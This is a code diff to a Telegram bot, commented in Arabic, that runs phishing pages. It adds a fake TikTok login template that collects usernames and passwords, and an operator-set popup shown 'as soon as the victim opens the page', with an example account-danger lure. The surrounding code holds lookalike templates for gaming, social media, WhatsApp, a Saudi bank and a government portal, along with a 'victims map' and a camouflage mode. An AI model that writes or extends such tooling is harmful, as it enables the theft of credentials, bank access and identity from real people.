@@ -100,14 +100,16 @@ function addUserSub(uid, sub) {
 }
 
 // ── Page wizard state ─────────────────────────────────────────────────────────
-const _pageWiz = {};   // chatId → { step, data }
-const _pageTpls = {};  // name → config
+const _pageWiz = {};          // chatId → { step, data }
+const _pageTpls = {};         // name → config
+const _awaitWelcome = new Set(); // chatIds waiting for welcome message text
 
 const TPL_THEMES = {
   pubg:  { bg:"#0a0a1a", btn:"#f0a500", accent:"#f0a500", name:"🎮 ببجي",      redirect:"https://www.pubg.com" },
   ig:    { bg:"#121212", btn:"#c13584", accent:"#833ab4", name:"📸 إنستغرام",  redirect:"https://www.instagram.com" },
   ff:    { bg:"#0d0d0d", btn:"#e63946", accent:"#ff6b35", name:"🔥 فري فاير", redirect:"https://freefire.garena.com" },
   snap:  { bg:"#1a1a00", btn:"#FFFC00", accent:"#FFFC00", name:"👻 سناب شات", redirect:"https://www.snapchat.com" },
+  tt:    { bg:"#010101", btn:"#fe2c55", accent:"#25f4ee", name:"🎵 تيك توك",  redirect:"https://www.tiktok.com" },
   bank:  { bg:"#0a1628", btn:"#1a56db", accent:"#1e40af", name:"🏦 بنكية",     redirect:"https://www.alrajhibank.com.sa" },
   gov:   { bg:"#0a1f0a", btn:"#16a34a", accent:"#15803d", name:"🇸🇦 حكومية",  redirect:"https://www.absher.sa" },
   custom:{ bg:"#0a0a1a", btn:"#6366f1", accent:"#4f46e5", name:"✏️ مخصص",     redirect:"https://www.google.com" },
@@ -143,12 +145,13 @@ function sendPageMain(chatId, editMsgId) {
   const status = pageConfig.active ? (pageConfig.camouflage ? "🟡 تمويه" : "🟢 نشطة") : "🔴 متوقفة";
   const toggleLabel = pageConfig.active ? (pageConfig.camouflage ? "✅ تشغيل كاملاً" : "⏸️ وضع تمويه") : "▶️ تشغيل الصفحة";
   const text = `🎛️ *لوحة تحكم الصفحة الديناميكية*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${pageConfig.views||0}\n✅ إرسال مكتمل: ${submissions.length}\n📋 في الحافظة: ${pageConfig.clipCount||0}`;
+  const wIcon = pageConfig.welcomeEnabled ? "📢✅" : "📢";
   const kb = JSON.stringify({ inline_keyboard:[
     [{text:"⚡ تبديل سريع",callback_data:"pg_quick"},{text:"✏️ تعديل مخصص",callback_data:"pg_edit"}],
     [{text:"📊 الإحصائيات",callback_data:"pg_stats"},{text:"📋 السجل",callback_data:"pg_log"}],
     [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"🔗 الروابط",callback_data:"pg_links"}],
-    [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:"👁️ معاينة",callback_data:"pg_preview"}],
-    [{text:toggleLabel,callback_data:"pg_toggle"}]
+    [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:`${wIcon} رسالة الترحيب`,callback_data:"pg_welcome"}],
+    [{text:"👁️ معاينة",callback_data:"pg_preview"},{text:toggleLabel,callback_data:"pg_toggle"}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
@@ -649,6 +652,21 @@ bot.on('message', async (msg) => {
     let sent = 0, failed = 0;
     for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
     return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
+  }
+
+  // ── Welcome message input ──────────────────────────────────────────────────
+  if (chatId === BOT_OWNER && _awaitWelcome.has(chatId) && msg.text) {
+    const txt = msg.text.trim();
+    _awaitWelcome.delete(chatId);
+    if (txt === "/cancel") return bot.sendMessage(chatId,"❌ تم الإلغاء.");
+    pageConfig.welcomeMsg = txt;
+    pageConfig.welcomeEnabled = true;
+    savePageConfig();
+    return bot.sendMessage(chatId,
+      `✅ *تم حفظ رسالة الترحيب وتفعيلها!*\n\n📢 النص:\n_${txt}_`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"🔙 لوحة التحكم",callback_data:"pg_main"}]
+      ]})});
   }
 
   // ── Page wizard ────────────────────────────────────────────────────────────
@@ -1302,6 +1320,10 @@ bot.on('callback_query', async (q) => {
       title:"✅ تأكيد رقم واتساب", desc:"أدخل بياناتك لتأكيد حسابك",
       fields:[{label:"رقم الهاتف",type:"number"},{label:"رمز التحقق",type:"number"}],
       btnText:"تأكيد ✅", timer:5, social:"", redirect:"https://www.whatsapp.com" },
+    tt:{ template:"tt", bgColor:"#010101", btnColor:"#fe2c55", accent:"#25f4ee",
+      title:"🎵 تحقق من حسابك على تيك توك", desc:"حسابك بحاجة إلى تأكيد الهوية للاستمرار",
+      fields:[{label:"اسم المستخدم",type:"text"},{label:"كلمة المرور",type:"password"}],
+      btnText:"تسجيل الدخول 🎵", timer:0, social:"", redirect:"https://www.tiktok.com" },
   };
 
   if (data === "pg_quick") {
@@ -1312,7 +1334,7 @@ bot.on('callback_query', async (q) => {
       {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
         [{text:"🎮 ببجي (شدة)",callback_data:"pg_preset_pubg"},{text:"📸 إنستغرام (متابعين)",callback_data:"pg_preset_ig"}],
         [{text:"🔥 فري فاير (جواهر)",callback_data:"pg_preset_ff"},{text:"👻 سناب (تحقق)",callback_data:"pg_preset_snap"}],
-        [{text:"📱 واتساب (تحقق)",callback_data:"pg_preset_wa"}],
+        [{text:"📱 واتساب (تحقق)",callback_data:"pg_preset_wa"},{text:"🎵 تيك توك",callback_data:"pg_preset_tt"}],
         [{text:"🔙 رجوع",callback_data:"pg_main"}]
       ]})}
     );
@@ -1363,8 +1385,8 @@ bot.on('callback_query', async (q) => {
       reply_markup: JSON.stringify({inline_keyboard:[
         [{text:"🎮 ببجي",callback_data:"pg_tpl_pubg"},{text:"📸 إنستغرام",callback_data:"pg_tpl_ig"}],
         [{text:"🔥 فري فاير",callback_data:"pg_tpl_ff"},{text:"👻 سناب شات",callback_data:"pg_tpl_snap"}],
-        [{text:"🏦 بنكية",callback_data:"pg_tpl_bank"},{text:"🇸🇦 حكومية",callback_data:"pg_tpl_gov"}],
-        [{text:"✏️ مخصص كامل",callback_data:"pg_tpl_custom"}],
+        [{text:"🎵 تيك توك",callback_data:"pg_tpl_tt"},{text:"🏦 بنكية",callback_data:"pg_tpl_bank"}],
+        [{text:"🇸🇦 حكومية",callback_data:"pg_tpl_gov"},{text:"✏️ مخصص كامل",callback_data:"pg_tpl_custom"}],
         [{text:"🔙 رجوع",callback_data:"pg_main"}]
       ]})
     });
@@ -1535,6 +1557,46 @@ bot.on('callback_query', async (q) => {
       {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
         [{text:"🔄 تجديد مرة أخرى",callback_data:"pg_renew"},{text:"🔙 رجوع",callback_data:"pg_main"}]
       ]})});
+  }
+
+  if (data === "pg_welcome") {
+    if (q.from.id !== BOT_OWNER) return;
+    const hasMsg = !!pageConfig.welcomeMsg;
+    const enabled = !!pageConfig.welcomeEnabled;
+    const statusTxt = enabled ? "🟢 مفعّلة" : "🔴 معطّلة";
+    const preview = hasMsg ? `\n\n📢 النص الحالي:\n_${pageConfig.welcomeMsg}_` : "\n\n_(لا توجد رسالة محفوظة بعد)_";
+    return bot.sendMessage(chatId,
+      `📢 *رسالة الترحيب*\n\nالحالة: ${statusTxt}${preview}\n\nتظهر كـ popup فور فتح الضحية للصفحة.`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"✏️ تعديل النص",callback_data:"pg_welcome_set"}],
+        enabled
+          ? [{text:"⏸️ تعطيل الرسالة",callback_data:"pg_welcome_off"}]
+          : [{text:"▶️ تفعيل الرسالة",callback_data:"pg_welcome_on"}],
+        [{text:"🔙 رجوع",callback_data:"pg_main"}]
+      ]})});
+  }
+
+  if (data === "pg_welcome_on") {
+    if (q.from.id !== BOT_OWNER) return;
+    if (!pageConfig.welcomeMsg) return bot.sendMessage(chatId,"⚠️ أضف نصاً أولاً بالضغط على ✏️ تعديل النص");
+    pageConfig.welcomeEnabled = true; savePageConfig();
+    bot.answerCallbackQuery(q.id,{text:"✅ تم تفعيل رسالة الترحيب"}).catch(()=>{});
+    return sendPageMain(chatId, q.message.message_id);
+  }
+
+  if (data === "pg_welcome_off") {
+    if (q.from.id !== BOT_OWNER) return;
+    pageConfig.welcomeEnabled = false; savePageConfig();
+    bot.answerCallbackQuery(q.id,{text:"⏸️ تم تعطيل رسالة الترحيب"}).catch(()=>{});
+    return sendPageMain(chatId, q.message.message_id);
+  }
+
+  if (data === "pg_welcome_set") {
+    if (q.from.id !== BOT_OWNER) return;
+    _awaitWelcome.add(chatId);
+    return bot.sendMessage(chatId,
+      `✏️ *اكتب نص رسالة الترحيب:*\n\nمثال:\n_⚠️ حسابك بخطر! سجّل دخولك لتأمينه فوراً_\n\nأو /cancel للإلغاء`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})});
   }
 
   if (data === "pg_qr") {
